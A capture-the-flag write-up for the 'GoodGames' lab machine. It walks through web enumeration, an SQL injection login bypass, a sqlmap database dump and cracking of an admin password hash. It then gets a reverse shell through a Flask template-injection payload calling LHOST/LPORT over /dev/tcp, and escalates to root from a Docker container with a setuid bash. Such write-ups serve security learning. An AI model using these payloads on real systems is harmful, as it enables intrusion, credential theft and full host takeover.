# GoodGames

First as usual, `nmap`.

```
# Nmap 7.92 scan initiated Mon Feb 28 13:33:25 2022 as: nmap -vvv -p 80 -sCV -oA init 10.10.11.130
Nmap scan report for 10.10.11.130
Host is up, received conn-refused (0.15s latency).
Scanned at 2022-02-28 13:33:39 +07 for 12s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Apache httpd 2.4.51
| http-methods:
|_  Supported Methods: HEAD GET OPTIONS POST
|_http-title: GoodGames | Community and Store
|_http-favicon: Unknown favicon MD5: 61352127DC66484D3736CACCF50E7BEB
|_http-server-header: Werkzeug/2.0.2 Python/3.9.2
Service Info: Host: goodgames.htb

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Feb 28 13:33:51 2022 -- 1 IP address (1 host up) scanned in 25.98 seconds
```

All we have is a website. At the bottom of the landing page is `GoodGames.HTB` so I added `goodgames.htb` to my `/etc/hosts` though using the domain name doesn't seem to be different from using the IP address. I still tried fuzzing for virtual hosts.

```sh
$ ffuf -u 'http://goodgames.htb/' -H "Host: FUZZ.goodgames.htb" -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 85107

ptuebiz-040             [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 308ms]
nbl                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 243ms]
smartconnect            [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 270ms]
clamp                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 873ms]
```

I added the subdomains to `/etc/hosts` and visited them but all gave the same `goodgames.htb` site.

Looking around the site, we have `/coming-soon` with a non-functional "subscribe" form and a single blog post at `/blog/1`. On that blog post is the username `admin` which we can try later. With nothing else to go off of, I fuzzed directories.

```sh
$ ffuf -u 'http://goodgames.htb/FUZZ' -w ~/tools/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 9265

login                   [Status: 200, Size: 9294, Words: 2101, Lines: 267, Duration: 537ms]
blog                    [Status: 200, Size: 44212, Words: 15590, Lines: 909, Duration: 561ms]
profile                 [Status: 200, Size: 9267, Words: 2093, Lines: 267, Duration: 475ms]
signup                  [Status: 200, Size: 33387, Words: 11042, Lines: 728, Duration: 470ms]
logout                  [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 520ms]
forgot-password         [Status: 200, Size: 32744, Words: 10608, Lines: 730, Duration: 194ms]
coming-soon             [Status: 200, Size: 10524, Words: 2489, Lines: 287, Duration: 290ms]
                        [Status: 200, Size: 85107, Words: 29274, Lines: 1735, Duration: 216ms]
Pontiac                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 1381ms]
us-travel               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 188ms]
reveal                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 194ms]
User_Information        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 231ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 347ms]
33129                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 284ms]
metalwarrior            [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 188ms]
biolist                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 175ms]
mkz                     [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 232ms]
Cormier22               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 227ms]
arrow_strong            [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 247ms]
41078                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 266ms]
85261                   [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 216ms]
header_bullet           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 232ms]
freelist                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 198ms]
treeline                [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 161ms]
0750                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 158ms]
```

Going to `/signup`, we can register an account and login so I did just that. After logging in, we're redirected to `/profile`.

I then logged out and tried SQL injection on the login and found that the payload `' or 1=1 -- -` worked on the email field and I got logged in as admin. I also tried changing admin's password but that doesn't work and just returns an HTTP 500 error. Looking at `/profile`, we get the email `admin@goodgames.htb`.

Since we know the login as SQLi, I went and enumerate and dump the DB with `sqlmap` using the login request intercepted in Burp.

```sh
$ sqlmap -r `pwd`/login.req --batch --technique=BEUSQ --threads 10 -D main -T user --dump

Database: main
Table: user
[1 entry]
+----+-------+---------------------+----------------------------------+
| id | name  | email               | password                         |
+----+-------+---------------------+----------------------------------+
| 1  | admin | admin@goodgames.htb | 2b22337f218b2d82dfc3b6f77e7cb8ec |
+----+-------+---------------------+----------------------------------+
```

Admin's MD5 hash can easily be cracked using [crackstation](https://crackstation.net/) to get `superadministrator`.

Looking at the source code of `/profile` while logged in as admin, we have `http://internal-administration.goodgames.htb` so we add the new domain name to `/etc/hosts` and enumerate that.

Using admin's credentials, we can log into the new application. A quick look tells us it's a Flask Volt application. Looking around, `/settings` seems interesting. Since we're working with a Flask application, I went and test for SSTI (Server-side Template Injection). Among the fields, "Full Name" is vulnerable as `{{5*5}}` returns `25`. Using the payload `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen("bash -c 'exec bash -i &>/dev/tcp/LHOST/LPORT <&1'").read() }}`, I got a shell on the machine as `root`.

A quick check of `/` shows we're in a Docker container.

```sh
root@3a453ab39d3d:/backend# ls -la /
ls -la /
total 88
drwxr-xr-x   1 root root 4096 Nov  5 15:23 .
drwxr-xr-x   1 root root 4096 Nov  5 15:23 ..
-rwxr-xr-x   1 root root    0 Nov  5 15:23 .dockerenv
<snip>
```

We have `augustus` in `/home` but not in `/etc/passwd` and we can't `su augustus` either, which is strange. Checking `mount` ...

```sh
root@3a453ab39d3d:/home/augustus# mount | grep augustus
/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)
```

... we see that it's actually mounted from another machine. Checking our IP address ...

```sh
root@3a453ab39d3d:/home/augustus# ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
5: eth0@if6: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default
    link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.19.0.2/16 brd 172.19.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

... we see that this container is `172.19.0.2`. Assuming there's a `172.19.0.1`, I `ping`'d it which works. I then ran a port scan on that machine.

```sh
root@3a453ab39d3d:/home/augustus# for PORT in {1..9000} ; do (echo  > /dev/tcp/172.19.0.1/$PORT) >& /dev/null && echo "Port $PORT seems to be open"; done
Port 22 seems to be open
Port 80 seems to be open
```

Port 22 is open so I tried to SSH in with `ssh augustus@172.19.0.1` which worked. To escalate to root, I did the following:

1. Copy `/bin/bash` to `/home/augustus` on `172.19.0.1`
2. Go back to `172.19.0.2`, ran `chown root:root bash` and `chmod u+s bash`
3. SSH back into `172.19.0.1` and use that `bash` with `./bash -p`

With that, we should have a root shell on the final host machine.
